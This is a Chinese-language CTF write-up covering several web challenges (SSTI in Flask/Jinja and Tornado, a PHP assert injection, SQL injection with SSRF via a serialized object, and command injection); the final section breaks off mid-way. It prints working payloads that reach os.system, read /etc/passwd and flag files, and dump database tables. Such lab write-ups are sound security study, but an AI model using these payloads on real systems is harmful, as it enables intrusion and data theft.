<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:59244&#x2F;%7B%7B&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)%7D%7D</span><br></pre></td></tr></table></figure>
<p>得知fl4g为flag所在地</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:59244&#x2F;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;cat fl4g&#39;).read() &#125;&#125;</span><br><span class="line">或者</span><br><span class="line">&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;fl4g&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>


<h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>学习<a target="_blank" rel="noopener" href="https://www.freebuf.com/column/187845.html">https://www.freebuf.com/column/187845.html</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">模板注入一般指flask下jinja模板引擎的注入，&#123;&#123;&#125;&#125;是变量包裹标识符，可以传递变量，可以执行简单表达式</span><br></pre></td></tr></table></figure>

<h2 id="判断是否有SSTI"><a href="#判断是否有SSTI" class="headerlink" title="判断是否有SSTI"></a>判断是否有SSTI</h2><p>在URL末尾添加，3观察表达式是否执行</p>
<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__class__  返回类型所属的对象</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   返回该对象所继承的基类</span><br><span class="line">&#x2F;&#x2F; __base__和__mro__都是用来寻找基类的</span><br><span class="line"></span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__ # 获取字符串类对象</span><br><span class="line">&#39;&#39;.__class__.__mro__ # 寻找基类</span><br><span class="line">&#39;&#39;.__class__.__mro__[2].subclasses__ # 寻找可用引用，其中type为file的可用</span><br><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() # 第40个引用为file类型，可用于读取文件</span><br><span class="line"></span><br><span class="line">for item in &#39;&#39;.__class__.__mro__[2].__subclasses__():</span><br><span class="line">    try:</span><br><span class="line">         if &#39;os&#39; in item.__init__.__globals__: # 寻找包括os的引用，一般为71 &lt;class &#39;site._Printer&#39;&gt;</span><br><span class="line">             print num,item</span><br><span class="line">         num+&#x3D;1</span><br><span class="line">    except:</span><br><span class="line">        print &#39;-&#39;</span><br><span class="line">        num+&#x3D;1</span><br><span class="line"></span><br><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</span><br></pre></td></tr></table></figure>


<h1 id="easytornado"><a href="#easytornado" class="headerlink" title="easytornado"></a>easytornado</h1><p>观察URL，发现URL由filename和filehash构成</p>
<p>打开网页有三个文件flag.txt，welcome.txt，hints.txt，分别打开后得知flag在/fllllllllllllag下，filehash=md5(cookie_secret+md5(filename))。</p>
<p>根据wp，tornado框架下的cookie_secret在handler.settings中可以查看，通过SSTI查看</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:42386&#x2F;error?msg&#x3D;&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>根据公式计算filehash</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;fllllllllllllag   3bf9f6cf685a6dd8defadabfb41a03a1</span><br><span class="line">&#39;cookie_secret&#39;: &#39;e8e46546-9657-4f0c-9838-ac21f21f13cf&#39;</span><br><span class="line"></span><br><span class="line">1a87b4db9ccdf43a09e252f25982e4a3</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3f39aea39db345769397ae895edb9c70&#125;</span><br></pre></td></tr></table></figure>
<h1 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a>shrine</h1><p>打开题目后阅读源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>) </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>) </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span> </span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">open</span>(__file__).read() </span><br><span class="line">	</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&#x27;</span></span>) </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span>(<span class="params">shrine</span>):</span> </span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span>(<span class="params">s</span>):</span> </span><br><span class="line">		s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>) </span><br><span class="line">		blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>] </span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s </span><br><span class="line">	<span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine)) </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>由关键词flask和jinja，判断是一道SSTI题</p>
<p>可以得知FLAG在config中</p>
<p>代码对SSTI注入的参数进行了两种过滤</p>
<ol>
<li>删除左括号(和右括号)</li>
<li>将变量config和self的值设置为None，简单来说就是不能直接访问config和self变量</li>
</ol>
<p>payload可以是下面任意一种</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;shrine&#x2F;&#123;&#123;url_for.__globals__[&quot;current_app&quot;].config&#125;&#125;</span><br><span class="line">&#x2F;shrine&#x2F;&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;shrine_is_good_ssti&#125;</span><br></pre></td></tr></table></figure>
<h2 id="SSTI常见内置函数和变量（flask）"><a href="#SSTI常见内置函数和变量（flask）" class="headerlink" title="SSTI常见内置函数和变量（flask）"></a>SSTI常见内置函数和变量（flask）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">config</span><br><span class="line">　　config 对象就是Flask的config对象，也就是 app.config 对象</span><br><span class="line">request</span><br><span class="line">　　Flask中代表当前请求的request对象</span><br><span class="line">session</span><br><span class="line">　　Flask的session对象</span><br><span class="line">url_for()</span><br><span class="line">　　url_for会根据传入的路由器函数名,返回该路由对应的URL,在模板中始终使用url_for()就可以安全的修改路由绑定的URL,则不比担心模板中渲染出错的链接</span><br><span class="line">get_flashed_messages()</span><br><span class="line">　　这个函数会返回之前在flask中通过flask()传入的消息的列表，flash函数的作用很简单,可以把由Python字符串表示的消息加入一个消息队列中，再使用get_flashed_message()函数取出它们并消费掉</span><br></pre></td></tr></table></figure>
<h1 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a>mfw</h1><p>首先打开网页，发现有三个可以点击的地方，都试试之后，观察URL为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:31715&#x2F;?page&#x3D;home</span><br></pre></td></tr></table></figure>
<p>形式。</p>
<p>根据wp，在about中提示使用了git，可以存在git泄露，于是访问</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:31715&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure>
<p>可以进入templates</p>
<p>使用githack.py进行下载，得到文件。存在flag文件，但是直接打开后没有东西，可能在下载时做了一些过滤。打开index.php文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;page&#39;])) &#123;</span><br><span class="line">	$page &#x3D; $_GET[&#39;page&#39;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	$page &#x3D; &quot;home&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file &#x3D; &quot;templates&#x2F;&quot; . $page . &quot;.php&quot;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; I heard &#39;..&#39; is dangerous!</span><br><span class="line">assert(&quot;strpos(&#39;$file&#39;, &#39;..&#39;) &#x3D;&#x3D;&#x3D; false&quot;) or die(&quot;Detected hacking attempt!&quot;); # 此处是关键</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; TODO: Make this look nice</span><br><span class="line">assert(&quot;file_exists(&#39;$file&#39;)&quot;) or die(&quot;That file doesn&#39;t exist!&quot;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">		&lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;</span><br><span class="line">		&lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;title&gt;My PHP Website&lt;&#x2F;title&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;twitter-bootstrap&#x2F;3.3.7&#x2F;css&#x2F;bootstrap.min.css&quot; &#x2F;&gt;</span><br><span class="line">	&lt;&#x2F;head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;nav class&#x3D;&quot;navbar navbar-inverse navbar-fixed-top&quot;&gt;</span><br><span class="line">			&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">		    	&lt;div class&#x3D;&quot;navbar-header&quot;&gt;</span><br><span class="line">		    		&lt;button type&#x3D;&quot;button&quot; class&#x3D;&quot;navbar-toggle collapsed&quot; data-toggle&#x3D;&quot;collapse&quot; data-target&#x3D;&quot;#navbar&quot; aria-expanded&#x3D;&quot;false&quot; aria-controls&#x3D;&quot;navbar&quot;&gt;</span><br><span class="line">		            	&lt;span class&#x3D;&quot;sr-only&quot;&gt;Toggle navigation&lt;&#x2F;span&gt;</span><br><span class="line">		            	&lt;span class&#x3D;&quot;icon-bar&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">		            	&lt;span class&#x3D;&quot;icon-bar&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">		            	&lt;span class&#x3D;&quot;icon-bar&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">		          	&lt;&#x2F;button&gt;</span><br><span class="line">		          	&lt;a class&#x3D;&quot;navbar-brand&quot; href&#x3D;&quot;#&quot;&gt;Project name&lt;&#x2F;a&gt;</span><br><span class="line">		        &lt;&#x2F;div&gt;</span><br><span class="line">		        &lt;div id&#x3D;&quot;navbar&quot; class&#x3D;&quot;collapse navbar-collapse&quot;&gt;</span><br><span class="line">		          	&lt;ul class&#x3D;&quot;nav navbar-nav&quot;&gt;</span><br><span class="line">		            	&lt;li &lt;?php if ($page &#x3D;&#x3D; &quot;home&quot;) &#123; ?&gt;class&#x3D;&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href&#x3D;&quot;?page&#x3D;home&quot;&gt;Home&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">		            	&lt;li &lt;?php if ($page &#x3D;&#x3D; &quot;about&quot;) &#123; ?&gt;class&#x3D;&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href&#x3D;&quot;?page&#x3D;about&quot;&gt;About&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">		            	&lt;li &lt;?php if ($page &#x3D;&#x3D; &quot;contact&quot;) &#123; ?&gt;class&#x3D;&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href&#x3D;&quot;?page&#x3D;contact&quot;&gt;Contact&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">						&lt;!--&lt;li &lt;?php if ($page &#x3D;&#x3D; &quot;flag&quot;) &#123; ?&gt;class&#x3D;&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href&#x3D;&quot;?page&#x3D;flag&quot;&gt;My secrets&lt;&#x2F;a&gt;&lt;&#x2F;li&gt; --&gt;</span><br><span class="line">		          	&lt;&#x2F;ul&gt;</span><br><span class="line">		        &lt;&#x2F;div&gt;</span><br><span class="line">		    &lt;&#x2F;div&gt;</span><br><span class="line">		&lt;&#x2F;nav&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;div class&#x3D;&quot;container&quot; style&#x3D;&quot;margin-top: 50px&quot;&gt;</span><br><span class="line">			&lt;?php</span><br><span class="line">				require_once $file;</span><br><span class="line">			?&gt;</span><br><span class="line">			</span><br><span class="line">		&lt;&#x2F;div&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;jquery&#x2F;1.12.4&#x2F;jquery.min.js&quot; &#x2F;&gt;</span><br><span class="line">		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;twitter-bootstrap&#x2F;3.3.7&#x2F;js&#x2F;bootstrap.min.js&quot; &#x2F;&gt;</span><br><span class="line">	&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<p>$file处是由page直接拼接成的，没有做过滤，此处可以注入</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page&#x3D;abc&#39;) or system(&quot;cat templates&#x2F;flag.php&quot;);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;685f2fb4f05573221e5a84e0849fe433&#125;</span><br></pre></td></tr></table></figure>
<h1 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h1><p>考察：sql注入、SSRF、反序列化</p>
<p>打开网页，首先把整个注册登录流程走一遍。</p>
<p>注册用户后，进入登录界面，发现URL为此格式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:30590&#x2F;view.php?no&#x3D;1</span><br></pre></td></tr></table></figure>
<p>考虑sql注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:30590&#x2F;view.php?no&#x3D;1 and 1&#x3D;1 # 成功</span><br><span class="line">http:&#x2F;&#x2F;220.249.52.134:30590&#x2F;view.php?no&#x3D;1 and 1&#x3D;2 # 失败</span><br></pre></td></tr></table></figure>
<p>故存在注入点</p>
<h2 id="手工注入-1"><a href="#手工注入-1" class="headerlink" title="手工注入"></a>手工注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查看返回列个数 &#x2F;view.php?no&#x3D;1 order by 4</span><br><span class="line">爆列名 &#x2F;view.php?no&#x3D;1 and updatexml(1,make_set(3,&#39;~&#39;,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;users&quot;)),1)#</span><br><span class="line">爆字段 &#x2F;view.php?no&#x3D;1 and updatexml(1,make_set(3,&#39;~&#39;,(select data from users)),1)#</span><br></pre></td></tr></table></figure>
<p>返回这一串东西</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:5:&quot;1.com&quot;;&#125; </span><br></pre></td></tr></table></figure>
<h2 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u http:&#x2F;&#x2F;220.249.52.134:30590&#x2F;view.php?no&#x3D;1 --batch </span><br></pre></td></tr></table></figure>
<p>不知道为什么，在时间注入那卡死了，跳过。</p>
<p>访问/robots.txt，发现存在备份文件/user.php.bak</p>
<p>访问/user.php.bak</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这一段可以说明get没有做过滤，可以SSRF</p>
<p>更改一下，做SSRF</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:30590&#x2F;view.php?no&#x3D;0&#x2F;**&#x2F;union&#x2F;**&#x2F;select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;c1e552fdf77049fabf65168f22f7aeab&#125;</span><br></pre></td></tr></table></figure>
<p>特别注意：++在URL中转译为空格，故也可以这么写</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看返回列个数 &#x2F;view.php?no&#x3D;1++order++by++4</span><br></pre></td></tr></table></figure>


<h2 id="sql手工注入"><a href="#sql手工注入" class="headerlink" title="sql手工注入"></a>sql手工注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆列名 &#x2F;view.php?no&#x3D;1 and updatexml(1,make_set(3,&#39;~&#39;,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;users&quot;)),1)#</span><br><span class="line">爆字段 &#x2F;view.php?no&#x3D;1 and updatexml(1,make_set(3,&#39;~&#39;,(select data from users)),1)#</span><br></pre></td></tr></table></figure>
<h2 id="fuzz测试"><a href="#fuzz测试" class="headerlink" title="fuzz测试"></a>fuzz测试</h2><p>fuzz测试也叫模糊测试，是一种黑盒测试。通过构造非法字段，观察被测试软件是否异常。</p>
<h2 id="wfuzz"><a href="#wfuzz" class="headerlink" title="wfuzz"></a>wfuzz</h2><p>kali下的fuzz测试工具</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">爆破文件</span><br><span class="line">wfuzz -w wordlist URL&#x2F;FUZZ.php</span><br><span class="line"></span><br><span class="line">爆破目录</span><br><span class="line">wfuzz -w wordlist URL&#x2F;FUZZ</span><br><span class="line"></span><br><span class="line">遍历枚举参数值</span><br><span class="line">wfuzz -z range,000-999 http:&#x2F;&#x2F;127.0.0.1&#x2F;getuser.php?uid&#x3D;FUZZ</span><br></pre></td></tr></table></figure>


<h1 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h1><p>考察：远程命令漏洞，Django，cURL</p>
<p>登录，只有一个输入域名的框，输入baidu.com&amp;ls，显示无效ip，因此判断是输入url</p>
<p>尝试输入127.0.0.1。</p>
<p>发现对127.0.0.1进行了ping，说明执行了命令</p>
<p>尝试以下简单命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|ls</span><br></pre></td></tr></table></figure>
<p>失败，提示URL不合法。</p>
<p>观察URL，发现命令直接在URL处以GET方式提交。考虑URL解析ASCII码只到%3F，因此提交%FF</p>
<p>返回一个特别长的HTML代码，保存后用浏览器打开。</p>
<p>得到的信息有：该网页为Django框架；数据库绝对路径为/opt/apt/database.sqlite3</p>
<p>php通常使用cURL库作为客户端和服务端通信，因此输入以下参数</p>
